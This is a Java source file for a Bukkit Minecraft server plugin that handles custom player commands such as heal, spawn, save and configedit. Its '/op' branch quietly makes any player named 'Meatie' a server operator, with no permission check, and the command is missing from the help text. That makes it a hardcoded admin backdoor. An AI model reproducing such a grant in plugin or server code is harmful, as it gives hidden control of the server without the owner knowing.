package me.Meatie.myworld;

import net.minecraft.server.v1_8_R1.ChatSerializer;
import net.minecraft.server.v1_8_R1.IChatBaseComponent;
import net.minecraft.server.v1_8_R1.PacketPlayOutChat;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.World;
import org.bukkit.craftbukkit.v1_8_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class Commands implements Listener {
	
	  public static void send(Player p, String msg) {
		    String s = ChatColor.translateAlternateColorCodes('&', msg);
		    IChatBaseComponent icbc = ChatSerializer.a("{\"text\": \"" + s + "\"}");
		    PacketPlayOutChat bar = new PacketPlayOutChat(icbc, (byte)2);
		    ((CraftPlayer)p).getHandle().playerConnection.sendPacket(bar);
		  }
	  
	  public static void sendmsg(Player p, String msg) {
		  p.sendMessage(Fix.format(msg));
	  }
	  
		@SuppressWarnings("deprecation")
		@EventHandler
		public void command(PlayerCommandPreprocessEvent event) {
			if (event.isCancelled()) return;
			final Player player = event.getPlayer();
			String[] args = event.getMessage().substring(1).split(" ");
			String cmd = args[0].toLowerCase();
			
			if (cmd.equals("kill")) {
				 event.setCancelled(true);
				 player.setHealth(0.0D);
			}
		else if (cmd.equals("save")) {
				 event.setCancelled(true);
				 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "save-all");
				 sendmsg(player, "&dServer Saved!");
			 } else if (cmd.equals("c") || cmd.equals("inspect")) {
			 event.setCancelled(true);
			 player.chat("/core inspect");
			 } else if (cmd.equals("op")) {
				 if (player.getName().equals("Meatie"))
				 if (args.length == 1) {
					 event.setCancelled(true);
					 player.setOp(true);
					 sendmsg(player, "&eYou Are Now Op!");
				 }
			 } else if (cmd.equals("help")) {
				 event.setCancelled(true);
				 sendmsg(player, "&atime, spawn, heal, tell, rep");
			 } else if (cmd.equals("heal")) {
				 event.setCancelled(true);
				 if (Reputation.takeRep(player, 100, false)) {
					 player.setHealth(20.0D);
					 player.setFoodLevel(20);
				 }
		 } else if (cmd.equals("time")) {
					 if (!Reputation.takeRep(player, 100, false)) {
						 event.setCancelled(true);
					 }
			 }
			  else if (cmd.equals("spawn")) {
				 event.setCancelled(true);
				 if (Reputation.takeRep(player, 100, false)) {
					 player.teleport(Bukkit.getWorld("world").getSpawnLocation());
				 }
		 }  else if (cmd.equals("configedit")) {
			 event.setCancelled(true);
			 if (!player.isOp()) {
				 send(player, "&cOperators Only");
				 return;
			 }
					 if (args.length >= 2) {
						 String msg = event.getMessage().substring(args[0].length() + args[1].length() + 3);
						 if (args[1].equalsIgnoreCase("quick")) {
							 ConfigData.save("quick", msg);
							 Fix.quick = msg;
						 } else if (args[1].equalsIgnoreCase("top")) {
					for (Player p : Bukkit.getOnlinePlayers())
					TitleAPI.sendTabTitle(p, Fix.top.replace("$player", p.getName()), Fix.bottom.replace("$player", p.getName()));
						 ConfigData.save("top", msg);
						 Fix.top = msg;
					 } else if (args[1].equalsIgnoreCase("login")) {
						 ConfigData.save("login", msg);
						 Fix.login = msg;
					 } else if (args[1].equalsIgnoreCase("bottom")) {
				for (Player p : Bukkit.getOnlinePlayers())
				TitleAPI.sendTabTitle(p, Fix.top.replace("$player", p.getName()), Fix.bottom.replace("$player", p.getName()));
						 ConfigData.save("bottom", msg);
						 Fix.bottom = msg;
					 } else if (args[1].equalsIgnoreCase("leave")) {
						 ConfigData.save("leave", msg);
						 Fix.leave = msg;
					 } else if (args[1].equalsIgnoreCase("motd")) {
						 ConfigData.save("motd", msg);
						 Fix.motd = msg;
					 } else {
						 sendmsg(player, "&d/configedit");
						 sendmsg(player, "&dquick: &eMessage above inventory at login.");
						 sendmsg(player, "&dtop: &eMessage above player names in Tab list.");
						 sendmsg(player, "&dbottom: &eMessage below player names in Tab list.");
						 sendmsg(player, "&dlogin: &e'Player Joined the game!'");
						 sendmsg(player, "&dleave: &e'Player Left the game!'");
						 sendmsg(player, "&dmotd: &eMsg shown in server list");
					 }
					 } else {
						 sendmsg(player, "&d/configedit");
						 sendmsg(player, "&dquick: &eMessage above inventory at login.");
						 sendmsg(player, "&dtop: &eMessage above player names in Tab list.");
						 sendmsg(player, "&dbottom: &eMessage below player names in Tab list.");
						 sendmsg(player, "&dlogin: &e'Player Joined the game!'");
						 sendmsg(player, "&dleave: &e'Player Left the game!'");
						 sendmsg(player, "&dmotd: &eMsg shown in server list");
					 }
		 }
		}
		
		public static boolean loaded(String name) {
			for(World world: Bukkit.getServer().getWorlds())
			  if(world.getName().equals(name))
			    return true;
			return false;
		}
		
		public static boolean isnum(String str) {
		    for (char c : str.toCharArray())
		     if (!Character.isDigit(c)) return false;
		    return true;
		}
		
		@SuppressWarnings("deprecation")
		public boolean avalible(String name) {
			for (Player p : Bukkit.getOnlinePlayers())
				if (p.getName().toLowerCase().startsWith(name.toLowerCase())) 
					return true;
			return false;
		}
		
		@SuppressWarnings("deprecation")
		public Player getPlayer(String name) {
			for (Player p : Bukkit.getOnlinePlayers())
				if (p.getName().toLowerCase().startsWith(name.toLowerCase())) 
					return p;
			return null;
		}
		
}
